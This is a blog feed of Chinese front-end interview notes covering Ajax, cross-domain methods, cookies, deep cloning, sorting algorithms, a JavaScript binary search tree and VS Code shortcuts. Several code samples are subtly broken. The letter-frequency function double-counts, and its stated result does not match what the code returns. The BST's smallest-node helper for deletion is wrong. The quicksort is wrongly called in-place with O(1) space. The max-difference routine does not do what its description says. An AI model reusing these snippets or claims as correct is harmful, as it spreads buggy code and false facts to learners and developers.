<h3 id="Ajax-是什么？Ajax-的交互模型？同步和异步的区别？如何解决跨域问题？"><a href="#Ajax-是什么？Ajax-的交互模型？同步和异步的区别？如何解决跨域问题？" class="headerlink" title="Ajax 是什么？Ajax 的交互模型？同步和异步的区别？如何解决跨域问题？"></a>Ajax 是什么？Ajax 的交互模型？同步和异步的区别？如何解决跨域问题？</h3><p>AJAX 的全称是异步的 Javascript 和 XML ，是一种创建快速动态网页的技术，通过在后台与服务器进行少量数据交互，实现网页的异步更新，在不重新加载整个界面的情况下，做到网页的部分刷新；<br><strong>AJAX 的交互模型（ AJAX 的过程）：</strong><br>用户发出异步请求；<br>创建 XMLHttpRequest 对象；<br>告诉 XMLHttpRequest 对象，哪个函数会处理 XMLHttpRequest 对象状态的改变，为此要把对象的 onReadyStateChange 属性设置为响应该事件的 JavaScript 函数的引用；<br>创建请求，用 open 方法指定是 get 还是 post ，是否异步， url 地址；<br>发送请求， send 方法；<br>接收结果并分析；<br>实现刷新<br><strong>同步异步的区别:</strong><br>同步：脚本会停留并等待服务器发送回复然后再继续<br>异步：脚本允许页面继续其进程，服务器返回结果时再作处理<br><strong>跨域问题的解决</strong><br>1、 使用 document.domain+iframe 解决跨子域问题<br>2、 使用 window.name<br>3、 使用 flash<br>4、 使用 iframe+location.hash<br>5、 使用 html5 的 postMessage ；<br>6、 使用 jsonp （创建动态 script ）</p>
<h3 id="js对象的深度克隆代码实现"><a href="#js对象的深度克隆代码实现" class="headerlink" title="js对象的深度克隆代码实现"></a>js对象的深度克隆代码实现</h3><pre><code>function clone(obj){
    if(!obj || typeof(obj) != &apos;object&apos;) return obj;
    var r = Array.prototype.splice === obj.splice ? []:{};
    for(var i in obj){
        if(obj.hasOwnProperty(i)){
            r[i] = clone(obj[i]);
        }
    }
    return r ;
}
//数组、对象都可以for in,同时针对对象必须需要判断hasOwnProperty属性，以防克隆原型链上的属性
</code></pre><p><a href="http://www.cnblogs.com/jq-melody/p/4499333.html" target="_blank" rel="noopener">javascript中对象的深度克隆</a></p>
<h3 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h3><p>网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。<br>对于传统的网站来说重构通常是：<br>1、 表格(table)布局改为 DIV + CSS<br>2、 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)<br>3、 对于移动平台的优化<br>4、 针对于 SEO 进行优化<br>5、 深层次的网站重构应该考虑的方面<br>6、 减少代码间的耦合<br>7、 让代码保持弹性<br>8、 严格按规范编写代码<br>9、 设计可扩展的API<br>10、 代替旧有的框架、语言(如VB)<br>11、 增强用户体验<br>12、 通常来说对于速度的优化也包含在重构中<br>13、 压缩JS、CSS、image等前端资源(通常是由服务器来解决)<br>14、 程序的性能优化(如数据读写)<br>15、 采用CDN来加速资源加载<br>16、 对于JS DOM的优化<br>17、 HTTP服务器的文件缓存</p>
<h3 id="如何获取UA"><a href="#如何获取UA" class="headerlink" title="如何获取UA"></a>如何获取UA</h3><p>浏览器标识（UA,User Agent）可以使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件，从而判断用户是使用电脑浏览还是手机浏览，让网页作出自动的适应。<br>使用navigator对象:<br>1、Navigator.appCodeName,浏览器代码名的字符表示<br>2、appName，浏览器的名称<br>3、appVersion 返回broswer平台和版本信息<br>4、platform，返回运行浏览器的操作系统平台<br>5、userAgent，返回客户机发送给服务器的useragent头部的值</p>
<pre><code>&lt;script&gt; 
function whatBrowser() {  
    document.Browser.Name.value=navigator.appName;  
    document.Browser.Version.value=navigator.appVersion;  
    document.Browser.Code.value=navigator.appCodeName;  
    document.Browser.Agent.value=navigator.userAgent;  
}
&lt;/script&gt;
</code></pre><h3 id="js-数组去重"><a href="#js-数组去重" class="headerlink" title="js 数组去重"></a>js 数组去重</h3><p>1、</p>
<pre><code>function uniqArray(arr) {
    //利用es6 新的数据类型，Set() 集合来做，集合不的每个元素是不允许重复的

    return [... new Set(arr)];

    //return Array.from(new Set(arr));
}
</code></pre><p>2、</p>
<pre><code>Array.prototype.filterOverlap = function(){
    var temp = [];
    if(!this.length){
         return [];
    }
    for(var i=0,len = this.length;i&lt;len;i++){
     if(temp.indexOf(this[i])&lt;0){
          temp.push(this[i]);
      }   
    }
    return temp;
}
</code></pre><h3 id="网页缓存-cache-control"><a href="#网页缓存-cache-control" class="headerlink" title="网页缓存 cache-control"></a>网页缓存 cache-control</h3><p>1、http响应头信息，可以用来设置缓存，优化页面的性能。<br>服务器可以通过HTTP定义的几种方式来指定在文档过期之前可以将其缓存多长时间。<br>2、添加在HTTP响应头中<br>3、no-store：禁止缓存对响应进行复制<br>no-cache：在与原始服务器进行新鲜度再验证之前，缓存不能将其提供给客户端使用<br>max-age: 从服务器将文档传来之时，可以认为此文档处于新鲜状态的秒数<br>max-age=0;将最大使用时间设置为零，从而在每次访问的时候都进行刷新<br>Expires响应首部：实际的过期时间而不是秒数 (GMT格式)</p>
<p><a href="http://www.51testing.com/html/28/116228-238337.html" target="_blank" rel="noopener">Http头介绍:Expires,Cache-Control,Last-Modified,ETag</a><br><a href="http://blog.csdn.net/zhouziyu2011/article/details/71312452" target="_blank" rel="noopener">浅谈前端性能优化（一）——Expires和Cache-Control</a></p>
<h3 id="js-操作获取和设置-cookie"><a href="#js-操作获取和设置-cookie" class="headerlink" title="js 操作获取和设置 cookie"></a>js 操作获取和设置 cookie</h3><pre><code>// 创建cookie
function setCookie(name, value, expires, path, domain, secure) {
    var cookieText = encodeURIComponent(name) + &apos;=&apos; + encodeURIComponent(value);
    if (expires instanceof Date) {
        cookieText += &apos;; expires=&apos; + expires;
    }
    if (path) {
        cookieText += &quot;; path=&quot; + path     }
    if (domain) {
        cookieText += &apos;; domain=&apos; + domain;
    }
    if (secure) {
        cookieText += &apos;; secure&apos;;
    }
    document.cookie = cookieText;
}
// 获取cookie
function getCookie(name) {
    var cookieName = encodeURIComponent(name) + &apos;=&apos;;
    var cookieStart = document.cookie.indexOf(cookieName);
    var cookieValue = null;
    if (cookieStart &gt; -1) {
        var cookieEnd = document.cookie.indexOf(&apos;;&apos;, cookieStart);
        if (cookieEnd == -1) {
            cookieEnd = document.cookie.length;
        }
        cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));
    }
    return cookieValue;
}
// 删除cookie
function unsetCookie(name) {
    document.cookie = name + &quot;= ; expires=&quot; + new Date(0);
}
</code></pre><p><a href="https://www.cnblogs.com/anniey/p/6510911.html" target="_blank" rel="noopener">前端开发中通过js设置/获取cookie的一组方法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自牛客网&lt;a href=&quot;https://www.nowcoder.com/ta/front-end-interview?query=&amp;amp;asc=true&amp;amp;order=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前端面试经典题目合集&lt;/a&gt; 篇学习总结。&lt;br&gt;
    
    </summary>
    
      <category term="面试题" scheme="http://yoursite.com/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
      <category term="面试题" scheme="http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>前端面试常见算法题总结</title>
    <link href="http://yoursite.com/2018/02/26/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    <id>http://yoursite.com/2018/02/26/前端面试常见算法题/</id>
    <published>2018-02-26T06:24:48.000Z</published>
    <updated>2018-05-29T02:37:37.119Z</updated>
    
    <content type="html"><![CDATA[<p>十道前端面试常见算法题。<br><a id="more"></a></p>
<h3 id="判断一个单词是否是回文"><a href="#判断一个单词是否是回文" class="headerlink" title="判断一个单词是否是回文"></a>判断一个单词是否是回文</h3><p>思路：将字符串转换为数组，利用数组方法reverse()比较翻转后的字符串是否与源字符串一致。</p>
<p>实现：</p>
<pre><code>function checkPalindrome(str) {
    return str == str.split(&apos;&apos;).reverse().join(&apos;&apos;);
}
</code></pre><h3 id="去掉一组整型数组重复的值"><a href="#去掉一组整型数组重复的值" class="headerlink" title="去掉一组整型数组重复的值"></a>去掉一组整型数组重复的值</h3><pre><code>function uniqueArr(arr) {
    var result = [];
    for(var i = 0; i &lt; arr.length; i++) {
        if(arr.indexOf(arr[i]) === i) {
            result.push(arr[i]);
        }
    }
    return result;
}
uniqueArr([1,13,24,11,11,14,1,2]);//返回 [1, 13, 24, 11, 14, 2]
</code></pre><h3 id="统计一个字符串出现最多的字母"><a href="#统计一个字符串出现最多的字母" class="headerlink" title="统计一个字符串出现最多的字母"></a>统计一个字符串出现最多的字母</h3><pre><code>function maxDuplicateLetter(str) {
    //如果字符串仅有一个字符，即为该字符
    if(str.length === 1) {
        return str;
    }
    var letterObj = {};
    for(var i = 0; i &lt; str.length; i++) {
        if(!letterObj[str[i]]) {//存放字母的对象中还未记录过该字母出现的次数
            letterObj[str[i]] = 1;
        }
        letterObj[str[i]] += 1;
    }
    //接下来寻找存放字母的对象中最大的value所对应的key
    var maxValue = 1;
    var maxKey = &apos;&apos;;
    for(var key in letterObj) {
        if(letterObj[key] &gt; maxValue) {
            maxValue = letterObj[key];
            maxKey = key;
        }
    }
    return maxKey;
}
maxDuplicateLetter(&quot;abcdddbb&quot;);//返回 &quot;a&quot;
</code></pre><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><p><strong>（1）冒泡排序</strong><br>依次比较相邻两个数的大小，进行位置上的交换，若按由小到大排序，第一轮可以将最大的排在最右边。<br>平均时间复杂度：O(n^2)  &nbsp;&nbsp;最好情况：O(n) &nbsp;&nbsp;  最坏情况：O(n^2)<br>空间复杂度：O(1)<br>排序方式:In-place<br>稳定性:稳定</p>
<pre><code>function bubbleSort(arr) {
    for(var i = 0; i &lt; arr.length; i++) {
        for(var j = 0; j &lt; arr.length - i -1; j ++) {
            // 由小到大排序
            if(arr[j] &gt; arr[j + 1]){
                var swap = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = swap;
            }
        }
    }
    return arr;
}
bubbleSort([3, 2, 4, 1, 7]);//返回 [1, 2, 3, 4, 7]
</code></pre><p><strong>(2)快速排序</strong><br>参考某个元素值，将小于它的值，放到左数组中，大于它的值的元素就放到右数组中，然后递归进行上一次左右数组的操作，返回合并的数组就是已经排好顺序的数组。<br>平均时间复杂度: O(n log n)  &nbsp;&nbsp;最好情况：O(n log n) &nbsp;&nbsp;  最坏情况：O(n^2)<br>空间复杂度：O(1)<br>排序方式:In-place<br>稳定性:不稳定</p>
<pre><code>function quickSort(arr) {
    if(arr.length &lt;= 1) {
        return arr;
    }
    var referValue = arr[0];
    var leftArr = [];
    var rightArr = [];
    // 由小到大排序
    for(var i = 1; i &lt; arr.length; i++) {
        if(arr[i] &lt; referValue) {
            leftArr.push(arr[i]);
        } else {
            rightArr.push(arr[i]);
        }
    }
    return quickSort(leftArr).concat([referValue], quickSort(rightArr));
}
quickSort([3, 2, 4, 1, 7]);//返回 [1, 2, 3, 4, 7]
</code></pre><p>另外还有 <strong>选择排序、插入排序、希尔排序、归并排序、堆排序、计数排序、桶排序等</strong>，见博客<a href="https://www.cnblogs.com/beli/p/6297741.html" target="_blank" rel="noopener">js十大排序算法</a>。</p>
<h3 id="不借助临时变量，进行两个整数的交换"><a href="#不借助临时变量，进行两个整数的交换" class="headerlink" title="不借助临时变量，进行两个整数的交换"></a>不借助临时变量，进行两个整数的交换</h3><p>利用 + – 去进行运算，类似 a = a + ( b – a) 实际上等同于最后 的 a = b;</p>
<pre><code>function swap([a, b]) {
    var b = b - a;
    var a = a + b;
    var b = a - b;
    return [a, b];
}
swap([2, 5]);//返回 [5, 2]
</code></pre><h3 id="使用canvas-绘制一个有限度的斐波那契数列的曲线"><a href="#使用canvas-绘制一个有限度的斐波那契数列的曲线" class="headerlink" title="使用canvas 绘制一个有限度的斐波那契数列的曲线"></a>使用canvas 绘制一个有限度的斐波那契数列的曲线</h3><p><img src="http://img1.vued.vanthink.cn/vued90edf7b944ec479ee8b4203cf56e158d.png" alt="斐波那契数列曲线"><br>数列长度限定在9时的图像。<br>斐波那契数列，又称黄金分割数列，指的是这样一个数列：0、1、1、2、3、5、8、13、21、34、……<br><code>fibo[i] = fibo[i-1]+fibo[i-2];</code><br>即生成斐波那契数列，然后再将该数列值作为半径，利用canvas arc方法绘制曲线。</p>
<pre><code>function generateFibo(n) {
    var fiboArr = [];
    var i = 0;
    while(i &lt; n) {
        if (i &lt;= 1) {
            fiboArr.push(i);
        } else {
            fiboArr[i] = fiboArr[i - 1] + fiboArr[i - 2];
        }
        i++;
    }
    return fiboArr;
}
generateFibo(6);//返回 [0, 1, 1, 2, 3, 5]
</code></pre><h3 id="找出正数组的最大差值"><a href="#找出正数组的最大差值" class="headerlink" title="找出正数组的最大差值"></a>找出正数组的最大差值</h3><p>相当于找到一个数组中的最大值与最小值，最大差值即为两者之差。</p>
<pre><code>function maxDifference(arr) {
    var minValue = arr[0];
    var maxDiffer = 0;
    for(var i = 0; i &lt; arr.length; i++) {
        minValue = Math.min(minValue, arr[i]);
        currentDiffer = arr[i] - minValue;
        maxDiffer = Math.max(maxDiffer, currentDiffer);
    }
    return maxDiffer;
}
maxDifference([10,5,11,7,8,9]);//返回 6
</code></pre><h3 id="随机生成指定长度的字符串"><a href="#随机生成指定长度的字符串" class="headerlink" title="随机生成指定长度的字符串"></a>随机生成指定长度的字符串</h3><pre><code>function randomString(n) {
    var rangeStr = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;;
    var l = rangeStr.length;
    var randomStr = &apos;&apos;;
    for(var i = 0; i &lt; n; i++) {
        randomStr += rangeStr.charAt(Math.floor(Math.random() * l));
    }
    return randomStr;
}
randomString(10);//返回 &quot;itfjah8rte&quot;
</code></pre><h3 id="实现类似getElementsByClassName-的功能"><a href="#实现类似getElementsByClassName-的功能" class="headerlink" title="实现类似getElementsByClassName 的功能"></a>实现类似getElementsByClassName 的功能</h3><p>查找某个DOM节点下面的包含某个class的所有DOM节点？不允许使用原生提供的 getElementsByClassName、 querySelectorAll 等原生提供DOM查找的函数。</p>
<pre><code>function queryClassName(node, name) {
    var starts = &apos;(^|[ \n\r\t\f])&apos;,
        ends = &apos;([ \n\r\t\f]|$)&apos;;
    var resultArr = [],
        reg = new RegExp(starts + name + ends),
        elements = node.getElementsByTagName(&quot;*&quot;);
        length = elements.length,
        i = 0;
    while(i &lt; length) {
        var element = elements[i];
        if(reg.test(element.className)) {
            resultArr.push(element);
        }
        i++;
    }
    return resultArr;
}
// 方法2
function queryClassName2(node, name) {
    var elements = node.getElementsByTagName(&quot;*&quot;),
        length = elements.length,
        resultArr = [];
    for(var i = 0; i &lt; length; i ++) {
        if(elements[i].className) {
            var classNames = elements[i].className.split(&quot; &quot;);/*这里其实还要考虑类名间隔大于一个空格的情况*/
            if(classNames.indexOf(name) !== -1) {
                resultArr.push(elements[i]);
            }
        }
    }
    return resultArr;
}
//HTML结构
&lt;ul id=&quot;ull&quot;&gt;  
    &lt;li&gt;0&lt;/li&gt;  
    &lt;li class=&apos;box box2&apos;&gt;1&lt;/li&gt;  
    &lt;li&gt;2&lt;/li&gt;  
    &lt;li class=&apos;box1&apos;&gt;3&lt;/li&gt;  
    &lt;li class=&apos;box1&apos;&gt;4&lt;/li&gt;  
    &lt;li class=&apos;box box1&apos;&gt;5&lt;/li&gt;   
&lt;/ul&gt;
//测试结果
 window.onload = function() {
    node = document.getElementById(&quot;ull&quot;);
    queryClassName(node, &quot;box&quot;);//返回 (2) [li.box.box2, li.box.box1]
    queryClassName2(node, &quot;box&quot;);// 返回 (2) [li.box.box2, li.box.box1]
};
</code></pre><h3 id="JS-实现二叉查找树-Binary-Search-Tree"><a href="#JS-实现二叉查找树-Binary-Search-Tree" class="headerlink" title="JS 实现二叉查找树(Binary Search Tree)"></a>JS 实现二叉查找树(Binary Search Tree)</h3><p>在实际使用时会根据链表和有序数组等数据结构的不同优势进行选择。有序数组的优势在于二分查找，链表的优势在于数据项的插入和数据项的删除。但是在有序数组中插入数据就会很慢，同样在链表中查找数据项效率就很低。综合以上情况，二叉树可以利用链表和有序数组的优势，同时可以合并有序数组和链表的优势，二叉树也是一种常用的数据结构。<br>二叉查找树，也称二叉搜索树、有序二叉树（英语：ordered binary tree）是指一棵空树或者具有下列性质的二叉树：</p>
<pre><code>任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；
任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；
任意节点的左、右子树也分别为二叉查找树；
没有键值相等的节点。二叉查找树相比于其他数据结构的优势在于查找、插入的时间复杂度较低。为O(log n)。二叉查找树是基础性数据结构，用于构建更为抽象的数据结构，如集合、multiset、关联数组等。
</code></pre><p><strong>二叉树相关概念：</strong><br>凡是每个节点都最多有两个叉的树，都叫二叉树。<br>查找树和排序树是一个东西。特点是中序遍历一遍的结果是单调的。这种树建出来可以用来做二分搜索。<br>平衡树一般是排序树的一种，并且加点条件，就是任意一个节点的两个叉的深度差不多（比如差值的绝对值小于某个常数，或者一个不能比另一个深出去一倍之类的）。<br>这样的树可以保证二分搜索任意元素都是O(log n)的，一般还附带带有插入或者删除某个元素也是O(log n)的的性质。<br>二叉树由节点（node）和边组成。节点分为根节点、父节点、子节点。如下图所示：</p>
<p><img src="http://img.blog.csdn.net/20160919221509693" alt="二叉树示意图"><br>红色是根节点（root）。蓝色是子节点也是父节点，绿色的是子节点。其余的线是边。节点和链表中的节点一样都可以存放数据信息。树中的边可以用自引用表示，这种引用就是C/C++里面的指针。通常来说树是顶部小，底部大，且树呈分层结构。root节点时第0层，以此类推。二叉树最多有两个节点。<br>二叉树搜索： 二叉树一个节点左子节点的关键字小于这个节点，右子节点关键字大于或等于这个父节点。<br>创建一个树节点。<br><strong>BST创建过程：</strong><br>(1)创建一个树节点包括左节点引用和右节点引用。<br>(2)创建一个树结构。 创建一个树结构首先是向一个树种插入数据节点。当一棵树为null时，数据项是从树的root节点处开始插入，之后的插入顺序是根据搜索节点顺序规则进行插入。具体规则是：如果数据项比父节点的数据项要小，则插在父节点的左节点（leftNode），如果比父节点的数据项要大，则将新的node插入在父节点的右节点处（rightNode）。<br>插入数据节点过程如下所示：<br><img src="http://img.blog.csdn.net/20160919230148150" alt="BST插入数据节点示意图"><br>插入节点的过程中其实也就是对tree遍历的过程，最终根据条件遍历到左右节点为null时进行添加新的节点。<br><strong>查找关键字</strong><br>查找关键字是数据结构一项重要操作项，在有序数组中通过二分排序效率非常高。在二叉树中的查找效率也比较高。因为二叉树的添加node的过程就是根据数据项的大小进行有序添加的，并不是毫无秩序的插入数据项。在有序的基础上进行查找关键字效率就会快很多。<br>树的最值查找在树中查找是比较容易的，因为从root开始查找，最小值只会出现所有父节点的左节点处，同样最大值只会出现在所有父节点的沿着右节点搜索的最底层右节点处。<br><a href="http://blog.csdn.net/cai2016/article/details/52589952" target="_blank" rel="noopener">参考自博客</a>。<br><strong>删除节点</strong><br>给出如下二叉查找树</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/blog/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98/BST.png" alt="二叉查找树"><br>删除节点3之后，可以返回</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/blog/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98/newBST1.png" alt="新的BST1"><br>或者</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/blog/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98/newBST2.png" alt="新的BST2"><br>思路:<br>若要删除一个BST的一个结点，需要考虑如下三种情况：</p>
<pre><code>需要删除的节点下并没有其他子节点
需要删除的节点下有一个子节点（左或右）
需要删除的节点下有两个子节点（既左右节点都存在）
</code></pre><p>对这三种情况分别采取的措施是：<br>    直接删除此结点<br>    删除此结点，将此结点父节点连接到此结点左（右）子树<br>    找出此结点右子树中的最小结点，用以代替要删除的结点，然后删除此最小结点</p>
<p><strong>设定每个节点的数据结构：</strong></p>
<pre><code>class Node {
    constructor(data, left, right) {
        this.data = data;
        this.left = left;
        this.right = right;
    }
}
</code></pre><p>树由节点构成，由根节点逐渐延生到各个子节点，因此它基本的结构就是具备一个根节点，具备添加，查找和删除节点的方法。</p>
<pre><code>// 构建BST，具备一个根节点、以及添加、查找、删除节点的方法
class BinarySearchTree {
    constructor() {
        this.root = null;
    }
    // 插入节点的方法
    insert(data) {
        let n = new Node(data, null, null);
        if (!this.root) { //如果此二叉树为空，则数据项从树的root节点处开始插入
            return this.root = n;
        }
        let currentNode = this.root;
        let parent = null;
        while (true) {
            parent = currentNode; //保存当current变为null之前的那一个父节点
            if (data &lt; currentNode.data) { //插在父节点的左节点
                currentNode = currentNode.left;
                if (currentNode === null) { //不断向左node寻找是否为null
                    parent.left = n;
                    break;
                }
            } else { //插在父节点的右节点
                currentNode = currentNode.right;
                if (currentNode === null) {
                    parent.right = n;
                    break;
                }
            }
        }
    }
    // 删除数据项
    remove(data) {
        this.root = this.removeNode(this.root, data);
    }
    // 删除节点
    // 删除树中与给定值相同的节点，如果树中没有相同值的节点，则不做处理，应该保证处理之后的树仍是二叉查找树。
    removeNode(node, data) {
        if (node === null) { // 如果根节点为空
            return null;
        }
        if (data === node.data) {
            // 没有子节点，即node为叶子节点
            if (node.left === null &amp;&amp; node.right === null) {
                return null;
            }
            // 要删除的节点下只有右节点
            if (node.left === null) {
                return node.right;
            }
            // 要删除的节点下只有左节点
            if (node.right === null) {
                return node.left;
            }
            // 要删除的节点下有两个子节点的情况
            // getSmallest用于找到该节点右子树中的最小节点，用以替代要删除的节点，然后删除此最小节点
            let getSmallest = function (node) {
                if (node.left === null &amp;&amp; node.right === null) {
                    return node;
                }
                if (node.left !== null) {
                    return node.left;
                }
                if (node.right !== null) {
                    return getSmallest(node.right);
                }
            }
            let temNode = getSmallest(node.right);
            node.data = temNode.data;
            node.right = this.removeNode(temNode.right, temNode.data);
            return node;
        } else if (data &lt; node.data) {
            node.left = this.removeNode(node.left, data);
            return node;
        } else {
            node.right = this.removeNode(node.right, data);
            return node;
        }
    }
    // 查找方法
    find(data) {
        let currentNode = this.root;
        while (currentNode !== null) {
            if (data === currentNode.data) {
                return true;
            }
            if (data &lt; currentNode.data) {
                if (currentNode.left !== null) {
                    currentNode = currentNode.left;
                } else {
                    return false;
                }
            } else {// data &gt; currentNode.data
                if (currentNode.right !== null) {
                    currentNode = currentNode.right;
                } else {
                    return false;
                }
            }
        }
    }
}
</code></pre><p>有关数组的一些操作见博客后半部分<a href="https://www.cnblogs.com/libin-1/p/5998870.html" target="_blank" rel="noopener">前端面试中的常见的算法问题</a>。</p>
<p>下面是一篇总结常见数据结构的javascript实现的文章：<br><strong><a href="http://blog.csdn.net/haoshidai/article/details/52263191" target="_blank" rel="noopener">常见数据结构的javascript实现</a></strong>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;十道前端面试常见算法题。&lt;br&gt;
    
    </summary>
    
      <category term="js算法题" scheme="http://yoursite.com/categories/js%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
      <category term="js算法题" scheme="http://yoursite.com/tags/js%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>vscode快捷键</title>
    <link href="http://yoursite.com/2018/02/26/vscodeKeyboardShortcuts/"/>
    <id>http://yoursite.com/2018/02/26/vscodeKeyboardShortcuts/</id>
    <published>2018-02-26T05:35:19.000Z</published>
    <updated>2018-05-29T02:33:10.487Z</updated>
    
    <content type="html"><![CDATA[<p>vscode中常用的快捷键功能。<br><a id="more"></a></p>
<h3 id="文本编辑"><a href="#文本编辑" class="headerlink" title="文本编辑"></a>文本编辑</h3><p>alt+up/down    向上/下移动单行</p>
<p>shift+alt+up/down    向上/下复制单行</p>
<p>shift+alt+f    格式化文本</p>
<p>command + +/-  增大/减小文本字体</p>
<p>Ctrl+Enter   在当前行下边插入一行</p>
<p>Ctrl+Shift+Enter  在当前行上方插入一行</p>
<p>代码行缩进：  向左缩进 Ctrl+[ &nbsp;&nbsp; 向右缩进 Ctrl+]</p>
<h3 id="光标相关"><a href="#光标相关" class="headerlink" title="光标相关"></a>光标相关</h3><p>移动到行首：Home</p>
<p>移动到行尾：End</p>
<p>移动到文件结尾：Ctrl+End</p>
<p>移动到文件开头：Ctrl+Home</p>
<p>移动到后半个括号： Ctrl+Shift+]</p>
<p>选中当前行   Ctrl+i</p>
<p>选择从光标到行尾   Shift+End</p>
<p>选择从行首到光标处   Shift+Home</p>
<p>删除光标右侧的所有字： Ctrl+Delete</p>
<p>删除光标所在行:    Ctrl+Shift+K </p>
<p>扩展/缩小选取范围： Shift+Alt+Left/Right</p>
<p>多行编辑(列编辑)：Alt+Shift+鼠标左键，Ctrl+Alt+Down/Up</p>
<p>同时选中所有匹配： Ctrl+Shift+L</p>
<p>回退上一个光标操作： Ctrl+U</p>
<h3 id="重构代码"><a href="#重构代码" class="headerlink" title="重构代码"></a>重构代码</h3><p>移动到定义处： F12</p>
<p>定义处缩略图：只看一眼而不跳转过去 Alt+F12</p>
<p>列出所有引用： Shift+F12</p>
<p>同时修改本文件中所有匹配的： Ctrl+F12</p>
<p>重命名：比如要修改一个方法名，可以选中后按 F2，输入新的名字，回车，会发现所有的文件都修改了</p>
<p>跳转到下一个 Error 或 Warning：当有多个错误时可以按 F8 逐个跳转</p>
<p>查看 diff： 在 explorer 里选择文件右键 Set file to compare，然后需要对比的文件上右键选择 Compare with file_name_you_chose</p>
<h3 id="左侧边栏及显示相关"><a href="#左侧边栏及显示相关" class="headerlink" title="左侧边栏及显示相关"></a>左侧边栏及显示相关</h3><p>打开资源  ctrl+shift+E</p>
<p>打开搜索  ctrl+shift+F</p>
<p>打开git    ctrl+shift+G</p>
<p>打开调试 ctrl+shift+D</p>
<p>打开扩展 ctrl+shift+X</p>
<p>全屏：F11</p>
<p>侧边栏显/隐：Ctrl+B</p>
<p>输出Show Output：  Ctrl+Shift+U</p>
<p>预览markdown：  Ctrl+Shift+V</p>
<h3 id="编辑器与窗口管理"><a href="#编辑器与窗口管理" class="headerlink" title="编辑器与窗口管理"></a>编辑器与窗口管理</h3><p>打开一个新窗口： Ctrl+Shift+N</p>
<p>关闭窗口： Ctrl+Shift+W</p>
<p>新建文件：   Ctrl+N</p>
<p>文件之间切换：   Ctrl+Tab</p>
<p>切出一个新的编辑器： Ctrl+\  (也可以按住 Ctrl 鼠标点击 Explorer 里的文件名。左中右 3 个编辑器的快捷键分别为 Ctrl+1 Ctrl+2 Ctrl+3)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vscode中常用的快捷键功能。&lt;br&gt;
    
    </summary>
    
      <category term="VScode" scheme="http://yoursite.com/categories/VScode/"/>
    
    
      <category term="VScode" scheme="http://yoursite.com/tags/VScode/"/>
    
  </entry>
  
</feed>
